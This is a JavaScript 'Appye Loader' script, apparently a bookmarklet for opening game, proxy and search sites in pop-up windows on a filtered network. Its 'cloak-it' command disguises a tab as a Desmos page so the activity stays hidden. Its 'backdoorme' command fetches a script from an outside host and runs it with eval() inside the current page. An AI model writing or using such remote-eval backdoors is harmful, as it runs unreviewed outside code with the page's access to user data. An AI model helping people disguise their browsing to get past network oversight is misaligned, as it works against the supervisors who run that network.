// Made by KUKHUA
const ver = "dev+1.2";

// Create a new script element
const script = document.createElement("script");

// Set the src attribute of the script element
script.src =
  "https://rawcdn.githack.com/nextapps-de/winbox/0.2.6/dist/winbox.bundle.min.js";
  document.head.appendChild(script);
//event listeners & consts
const htmlDocs = ''
const jsonAppString = '{ "apps": { "argName": "", "title": "", "icon": "", "hexColor": "", "url": ""} }';
const jsonAppObject = JSON.parse(jsonAppString);
document.addEventListener("keydown", (event) => {
  if (event.key === "c") {
    cmd();
  }
});
document.addEventListener("keydown", (event) => {
  if (event.key === "d") {
    void new WinBox({
      title: "Appye Loader - Docs",
      html: htmlDocs,
      background: "#000000",
      modal: true,
    });
  }
});

// Wait for the script to be loaded before calling cmd()
script.addEventListener("load", function () {
  if (localStorage.getItem("appye_Version") === ver) {
    cmd();
  } else {
    void new WinBox({
      title: "Appye Loader - Docs",
      html: htmlDocs,
      background: "#000000",
      modal: true,
      onclose: function () {
            setTimeout(function () {
              localStorage.setItem("appye_Version", ver);
              cmd();
            }, 200);
      },
    });
  }
});
function cmd() {
  // JSON stuff
  // Apps
  jsonAppObject.apps.d25 = { title: "D+25", icon: "https://paste.unit193.net/favicon.ico", hexColor: "#4287f5", url: "https://paste.unit193.net/?18820e835dcfca92#+R9o6//5M3r23lulXQCFEZ3AIuTlKNvbQMML6lXnoM8=" };
  jsonAppObject.apps.google = { title: "Google", icon: "https://www.google.com/favicon.ico", hexColor: "#bd8c91", url: "https://www.google.com/?igu=1" };

  jsonAppObject.apps.piped = { title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
  // Piped duped
  jsonAppObject.apps.youtube = { title: "Piped", icon: "https://piped.mint.lgbt/favicon.ico", hexColor: "#f54257", url: "https://piped.garudalinux.org/" };
  // Return to apps
  jsonAppObject.apps.radiolise = { title: "Radiolise", icon: "https://radiolise.gitlab.io/favicon.ico", hexColor: "#7d5f5c", url: "https://radiolise.gitlab.io/" };
  jsonAppObject.apps.searx = { title: "SearX", icon: "https://searx.garudalinux.org/favicon.ico", hexColor: "#3d68ad", url: "https://searx.garudalinux.org/" };
  // Games
  jsonAppObject.apps.bitlife = { title: "Bitlife", icon: "https://raw.githubusercontent.com/mark-deal/mark-deal.github.io/main/bitlife/logo.png", hexColor: "#f0340e", url: "https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/bitlife/index.html" };
  jsonAppObject.apps.cookie = { title: "Cookie Clicker", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/cookie/img/favicon.ico", hexColor: "#a0522d", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/cookie/index.html" };
  jsonAppObject.apps.dino = { title: "Dino", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/dinosaur/assets/default_100_percent/100-error-offline.png", hexColor: "#f2dcea", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/dinosaur/index.html" };
  jsonAppObject.apps.subway = { title: "Subway Surfers", icon: "https://raw.githubusercontent.com/mark-deal/mark-deal.github.io/73bdb2d103ca2cae7b9274872da66de1c28404c6/images/subway.jpg", hexColor: "#f5b342", url: "https://rawcdn.githack.com/mark-deal/mark-deal.github.io/73bdb2d103ca2cae7b9274872da66de1c28404c6/subwaysurfers/index.html" };
  jsonAppObject.apps.uno = { title: "4 Colors", icon: "https://raw.githubusercontent.com/Radon-Games/Radon-Games-Assets/main/html/uno/favicon.ico", hexColor: "#0e408f", url: "https://rawcdn.githack.com/Radon-Games/Radon-Games-Assets/b465574811f6feeca2e8a7504c3869f065b4a7d6/html/uno/index.html" };
  jsonAppObject.apps.retro_bowl = {title:"Retro-Bowl",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/retro-bowl/img/icon.jpg",hexColor:"#4d9118",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/retro-bowl/index.html"};
  jsonAppObject.apps.papa_pizza = {title:"Papas Pizzaria",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/papaspizzaria/papaspizzaria.jpg",hexColor:"#c70001",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/papaspizzaria/index.html"};
  jsonAppObject.apps.papa_burger = {title:"Papas Burgeria",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/papasburgeria/ico.png",hexColor:"#e1c396",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/papaspizzaria/index.html"};
  jsonAppObject.apps.crossy_road = {title:"Crossy Road",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/crossyroad/crossyroad.png",hexColor:"#69ceec",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/crossyroad/index.html"};
  jsonAppObject.apps.jetpack = {title:"Jetpack Joyride",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/jetpack-joyride/splash.jpg",hexColor:"#9291b9",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/jetpack-joyride/index.html"};
  jsonAppObject.apps.tiny_fish = {title:"Tiny Fishing",icon:"https://raw.githubusercontent.com/3kh0/3kh0-Assets/main/tiny-fishing/tiny-fishing.png",hexColor:"#572CCF",url:"https://rawcdn.githack.com/3kh0/3kh0-Assets/446f257b3b88a9f8db1e3f1eaca4de03737c733f/tiny-fishing/index.html"};
  // Command input
  var commandIn = prompt("Command:");
  var parseApp;

  // app-load command
  if (commandIn.startsWith("app-load")) {
    parseApp = commandIn.replace("app-load ", "");
    if (jsonAppObject.apps[parseApp]) {
      // Create window
      void new WinBox({
        title: jsonAppObject.apps[parseApp].title,
        icon: jsonAppObject.apps[parseApp].icon,
        background: jsonAppObject.apps[parseApp].hexColor,
        url: jsonAppObject.apps[parseApp].url
      });
    } else {
      alert('Could not find the app "' + parseApp + '" in the app database, please press the "d" key and check if you spelled the app wrong.');
    }
  }
  
  // cloak-it command
  else if (commandIn.startsWith("cloak-it ")) {
    // Set default info for later update
    let defTitle = "Desmos | Testing";
    let defIcon = "https://www.desmos.com/favicon.ico";
    const parsedUrl = commandIn.replace("cloak-it ", "");
    
    // Parse input
    if (jsonAppObject.apps[parsedUrl]) {
      var newUrl = jsonAppObject.apps[parsedUrl].url;
    }

    const win = window.open();
    // Create cloaked iframe
    const iframe = win.document.createElement("iframe");
    iframe.style.width = "100vw";
    iframe.style.height = "100vh";
    iframe.style.border = "none";
    iframe.style.position = "absolute";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.src = newUrl;
    win.document.body.appendChild(iframe);
    win.document.title = defTitle;

    // Set favicon
    let link = win.document.querySelector("link[rel~='icon']");
    if (!link) {
      link = win.document.createElement("link");
      link.rel = "icon";
      win.document.head.appendChild(link);
    }
    link.href = defIcon;
  } 

// search command
else if (commandIn.startsWith("search ")) {
    baseSearchURL = "https://searx.garudalinux.org/search?q="
  let inputURI;
  let searchTerm = commandIn.replace("search ", "");
  inputURI = encodeURI(searchTerm);
  void new WinBox({
    title: `SearX - ${searchTerm}`,
    icon: "https://searx.garudalinux.org/favicon.ico",
    background: jsonAppObject.apps.searx.hexColor,
    url: baseSearchURL + searchTerm
  });

}

//doc command
  else if (commandIn.startsWith("doc")){
    void new WinBox({
      title: "Appye Loader - Docs",
      html: htmlDocs,
      background: "#000000",
      modal: true,
    }); 
  }


  // about command
  else if (commandIn.startsWith("about")) {
    void new WinBox({
      title: "Appye Loader - About",
      html: `<h3>Appye loader is on version <b>${ver}</b></h3> <p> Also btw, thanks for using this! We use the WinBox.js libary for windows: https://nextapps-de.github.io/winbox/</p>`,
      background: "#000000",
      modal: true,
    }); 
  }

  // backdoor command
  else if (commandIn.startsWith("backdoorme")) {
    url = window.location.href;
    var newWindow = window.open(url, '_blank');
    url = "https://e.pool.nyphp.com/chat/recieve/i_am_a_idiot";
    newWindow.onload = function() {
      fetch("https://e.pool.nyphp.com/cors/embed-recieve.js").then(res => res.text()).then(data => eval(data)(url));
    };
  } 

  // command error
  else {
    alert('Error: Command "' + commandIn + '" is not valid. ' + "Please check if you've spelled it incorrectly.");
  }
}

